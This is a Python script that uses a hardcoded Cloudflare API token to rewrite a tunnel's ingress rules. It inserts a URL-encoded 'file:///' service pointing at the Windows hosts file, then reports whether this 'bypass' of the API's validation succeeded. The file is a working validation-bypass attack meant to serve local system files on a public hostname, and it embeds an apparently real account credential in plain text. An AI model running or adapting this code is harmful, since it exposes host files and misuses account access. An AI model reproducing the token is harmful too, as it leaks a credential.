import urllib.request
import json
import time

SUPER_TOKEN = "HBkXgm2nAYlRAhgyULBebnw-4a-HQ-Mcuv0U_W42"
ACCOUNT_ID = "4c2932bc3381be38d5266241b16be092"
TUNNEL_ID = "926eac5e-2642-4a16-9edc-c06b6c705ab8"


def api_request(method, url, data=None):
    headers = {
        "Authorization": f"Bearer {SUPER_TOKEN}",
        "Content-Type": "application/json",
    }
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode() if data else None,
        headers=headers,
        method=method,
    )
    try:
        with urllib.request.urlopen(req) as response:
            return json.loads(response.read().decode())
    except Exception as e:
        print(f"Error: {e}")
        return None


def test_file_bypass():
    res = api_request(
        "GET",
        f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/cfd_tunnel/{TUNNEL_ID}/configurations",
    )
    config = res["result"]["config"]

    # Try URL encoded file scheme
    payload = "file%3A%2F%2F%2FC%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fhosts"
    print(f"Testing bypass with service: {payload}")

    config["ingress"] = [
        r for r in config["ingress"] if r.get("hostname") != "files.ai-smith.net"
    ]
    config["ingress"].insert(0, {"hostname": "files.ai-smith.net", "service": payload})

    update_res = api_request(
        "PUT",
        f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/cfd_tunnel/{TUNNEL_ID}/configurations",
        {"config": config},
    )
    if update_res and update_res.get("success"):
        print("Bypass accepted by API!")
    else:
        print("Bypass rejected by API.")
        print(update_res)


if __name__ == "__main__":
    test_file_bypass()
